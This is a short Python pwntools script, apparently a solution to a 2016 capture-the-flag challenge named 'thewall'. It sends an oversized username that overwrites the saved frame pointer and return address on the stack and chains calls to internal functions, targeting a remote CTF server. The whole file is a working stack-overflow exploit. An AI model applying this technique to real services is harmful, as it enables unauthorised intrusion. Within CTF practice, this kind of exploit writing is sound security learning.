import os
from pwn import *

context.terminal = 'urxvt'

try:
    os.remove('users.db')
except:
    pass


# Offset

l_crypto_key = 0x804b0a8
l_bss        = 0x804b5f0

f_puts       = 0x8048620
f_print_user = 0x8048B06
f_each_user  = 0x8048A0C

g_fgets      = 0x8048E13 # stdin

# Generate username

ebp = l_bss
eip = f_each_user

username = fit({
    44: ebp,
    48: eip,
    52: f_print_user,
    56: f_print_user,
    60: f_print_user,
}, length = 64)

password = '1337'


# p = process(['./thewall', '0x%x' % 0x13371337])
p = remote('ctf2016.the-playground.dk', 14001)

# Register

print 'Register'
p.sendline('2')
p.sendline(username)
p.sendline(password)

"""
# Login

p.sendline('1')
p.sendline(username)
"""

"""
gdb.attach(p, '''
    b *0x8048d61
    b *0x8048a54
    b print_user
    c
''')
"""

p.sendline('2')
p.sendline('B' * 20)

# print_user
#
p.interactive()
